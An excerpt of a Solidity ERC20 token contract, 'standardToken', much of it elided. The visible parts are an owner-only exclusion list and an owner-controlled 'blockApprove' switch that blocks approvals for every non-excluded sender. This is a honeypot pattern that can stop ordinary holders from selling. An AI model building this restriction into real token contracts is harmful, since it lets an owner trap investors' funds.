...
contract standardToken is Context, IERC20, IERC20Metadata,Ownable {
    ...
    constructor (string memory name_, string memory symbol_,uint8 decimals_, uint256 tokenSupply_) {
        ...
        _mint(msg.sender,tokenSupply_* (10**decimals_));
    ...
    //Getter and Setter for the Exclude
    function includeInisExcluded(address account) external onlyOwner {	
        _isExcluded[account] = true;	
    }
    
    function removefromisExcluded(address account) external onlyOwner{	
    ...
    function setblockApprove(bool _state) external onlyOwner{
        blockApprove = _state;
    }
	...
	if(blockApprove && !_isExcluded[msg.sender]){
